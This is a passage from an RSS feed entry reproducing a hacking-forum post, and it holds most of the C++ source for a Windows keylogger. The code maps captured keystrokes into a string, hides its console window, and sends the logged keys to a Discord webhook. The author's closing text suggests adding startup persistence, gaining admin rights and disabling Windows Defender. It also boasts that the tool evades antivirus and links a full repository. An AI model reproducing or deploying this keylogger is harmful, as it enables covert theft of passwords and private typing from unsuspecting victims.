                    else if ((c &gt; 64) &amp;&amp; (c &lt; 91))
                    {
                        keyz += c;
                       
                        break;
                    }
                    else {

                        switch (c)
                        {
                        case 48:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += ")";
                            else
                                keyz += "0";
                        }
                        break;

                        case 49:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "!";
                            else
                                keyz += "1";
                        }
                        break;

                        case 50:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "@";
                            else
                                keyz += "2";
                        }
                        break;

                        case 51:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "#";
                            else
                                keyz += "3";
                        }
                        break;

                        case 52:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "$";
                            else
                                keyz += "4";
                        }
                        break;

                        case 53:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "%";
                            else
                                keyz += "5";
                        }
                        break;

                        case 54:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "^";
                            else
                                keyz += "6";
                        }
                        break;

                        case 55:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "&amp;";
                            else
                                keyz += "7";
                        }
                        break;

                        case 56:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "*";
                            else
                                keyz += "8";
                        }
                        break;

                        case 57:
                        {
                            if (GetAsyncKeyState(0x10))
                                keyz += "(";
                            else
                                keyz += "9";
                        }
                        break;

                        case VK_SPACE:
                            keyz += " ";
                            break;
                        case VK_RETURN:
                            keyz += "\n";
                            break;
                        case VK_TAB:
                            keyz += "  ";
                            break;
                        case VK_BACK:
                            keyz += " &lt;BACKSPACE&gt; ";
                            break;
                        case VK_DELETE:
                            keyz += " &lt;Del&gt; ";
                            break;
                        case VK_NUMPAD0:
                            keyz += "0";
                            break;
                        case VK_NUMPAD1:
                            keyz += "1";
                            break;
                        case VK_NUMPAD2:
                            keyz += "2";
                            break;
                        case VK_NUMPAD3:
                            keyz += "3";
                            break;
                        case VK_NUMPAD4:
                            keyz += "4";
                            break;
                        case VK_NUMPAD5:
                            keyz += "5";
                            break;
                        case VK_NUMPAD6:
                            keyz += "6";
                            break;
                        case VK_NUMPAD7:
                            keyz += "7";
                            break;
                        case VK_NUMPAD8:
                            keyz += "8";
                            break;
                        case VK_NUMPAD9:
                            keyz += "9";
                            break;
                        case VK_LBUTTON:
                            keyz += " **MOUSE_LEFT** ";
                            break;
                        case VK_RBUTTON:
                            keyz += " **MOUSE RIGHT** ";
                            break;
                        case VK_CAPITAL:
                            keyz += " **CAPS** ";
                            break;
                        case VK_SHIFT:
                            keyz += " **SHIFT** ";
                            break;
                        default:
                            keyz += c;
                        }
                    }
                }
            }
        }
    }
    void StealthMode() { // function to hide window and run in the background
        AllocConsole();
        HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(stealth, 0);
    }

    void SendKeyz(string keyz) // function to send logged keys to discord webhook
    {
        dpp::cluster bot("");
        dpp::webhook wh("WEBHOOK");
        bot.execute_webhook(wh, dpp::message(keyz));     
    }
};

int main() {
    Functions FunctionObject;
    string c;

    thread t1(&amp;Functions::countTime, &amp;FunctionObject, ref(c));
    thread t2(&amp;Functions::StartLogging, &amp;FunctionObject, ref(c));
    thread t3(&amp;Functions::StealthMode, &amp;FunctionObject);

    t1.detach();
    t2.join();
    t1.join();
    t3.join();

    return 0;
}
</code></pre>
<p>You could add other features like adding it to startup or gaining admin privs and disabling windows defender, although last time I checked this was undetectable.</p>
<p>That’s the end of this thread. This is my first post, so let me know if there’s something wrong with it. Feel free to leave a like if you found this useful and let me know if there are any bugs that I’m not aware of.</p>
<p><strong>Full Code</strong></p><aside class="onebox allowlistedgeneric" data-onebox-src="https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook">
  <header class="source">
      <img src="https://codeberg.org/assets/img/favicon.svg" class="site-icon" width="15" height="15">

      <a href="https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook" target="_blank" rel="noopener nofollow ugc">Codeberg.org</a>
  </header>

  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/3X/e/e/ee03c3e147b566430d65580159917e53b12deaf3.png" class="thumbnail onebox-avatar" width="290" height="290">

<h3><a href="https://codeberg.org/0xDarkSky/WindowsKeylogger-DCWebhook" target="_blank" rel="noopener nofollow ugc">WindowsKeylogger-DCWebhook</a></h3>

  <p>Windows10 C++ keylogger with Discord webhook implementation, run in background and threads. FUD on most AVs</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/own-a-windows-keyboard/34534/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/own-a-windows-keyboard/34534/1</link>
        <pubDate>Sat, 15 Apr 2023 21:03:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-34534-1</guid>
        <source url="https://0x00sec.org/t/own-a-windows-keyboard/34534.rss">Own a Windows Keyboard</source>
      </item>
  </channel>
</rss>
